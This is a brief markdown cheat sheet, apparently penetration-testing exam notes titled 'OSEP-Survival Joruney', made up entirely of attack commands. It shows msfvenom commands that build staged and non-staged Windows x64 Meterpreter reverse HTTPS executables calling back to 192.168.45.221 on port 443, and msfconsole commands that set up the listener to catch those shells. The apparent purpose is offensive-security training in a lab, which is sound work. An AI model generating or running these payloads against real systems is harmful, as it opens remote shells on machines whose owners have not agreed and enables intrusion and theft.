# OSEP-Survival Joruney: Complete Guide

## Reverse Shell Handler 

### Metasploit Payload Generation
```
#Staged
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.221 LPORT=443 -f exe -o ./msfstaged.exe

#NonStaged
sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.221 LPORT=443 -f exe -o ./msfnonstaged.exe
```

### Metasploit Basic handler
```
sudo msfconsole -q
set payload windows/x64/meterpreter/reverse_https
set lhost 192.168.45.221
```

